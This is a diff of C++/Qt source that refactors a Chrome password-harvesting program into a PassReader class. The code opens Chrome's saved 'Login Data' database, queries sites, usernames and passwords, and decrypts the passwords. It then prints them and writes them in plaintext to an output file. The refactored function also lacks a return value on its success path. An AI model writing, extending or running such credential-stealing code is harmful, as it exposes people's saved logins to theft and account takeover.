@@ -1,34 +1,33 @@
-#include <iostream>
-#include <QCoreApplication>
-#include <QtSql/QSqlDatabase>
-#include <QSqlQuery>
-#include <QString>
-#include <QDebug>
-#include <QSqlError>
-#include <QFile>
+#include "passReader.h"
 
-#include <windows.h>
-//#include "dpapi.h"
-//#include <wincrypt.h>
-
-using namespace std;
-
-int main(int argc, char *argv[])
+PassReader::PassReader()
 {
-    QCoreApplication a(argc, argv);
-    setlocale(LC_CTYPE, "rus");
+    path = new QString(QDir::currentPath());
+}
 
+PassReader::PassReader(QString &str)
+{
+    path = new QString(str);
+}
+
+PassReader::~PassReader()
+{
+    delete path;
+}
+
+bool PassReader::readPass()
+{
+    setlocale(LC_CTYPE, "rus");
     QString fileName;
 
     //Get command line arguments
     fileName = "output.txt";
-    if (argc > 1) fileName = argv[1];
 
     //Output file
     QFile file(fileName);
     file.open(QIODevice::WriteOnly);
 
-    //Connect to DB
+    //Open DB
     QSqlDatabase db;
     db = QSqlDatabase::addDatabase("QSQLITE");
 
@@ -38,14 +37,8 @@ int main(int argc, char *argv[])
 
     //Destination folder
     db.setDatabaseName(appdata + "/../Local/Google/Chrome/User Data/Default/Login Data");
-    db.open();
 
-
-    if ( !db.isOpen() )
-    {
-        qDebug() << "Error\n";
-    }
-    else
+    if (db.open())
     {
         //Create SQL Query; select url+login+pass
         QSqlQuery query;
@@ -83,7 +76,7 @@ int main(int argc, char *argv[])
                 pass_decr.append(reinterpret_cast<char *>(DataOut.pbData));
                 pass_decr.resize(pass_size);
 
-                qDebug().noquote() << endl << url << endl << "user = " << user << "\npass = " << pass_decr;
+                qDebug() << endl << url << endl << "user = " << user << "\npass = " << pass_decr;
 
                 //Stream for writing
                 QTextStream stream(&file);
@@ -91,12 +84,13 @@ int main(int argc, char *argv[])
             }
             else
             {
-                qDebug() << "\nDecryption error!";
+                return false;
             }
         }
     }
-
+    else
+        return false;
     file.close();
 
-    return a.exec();
+
 }
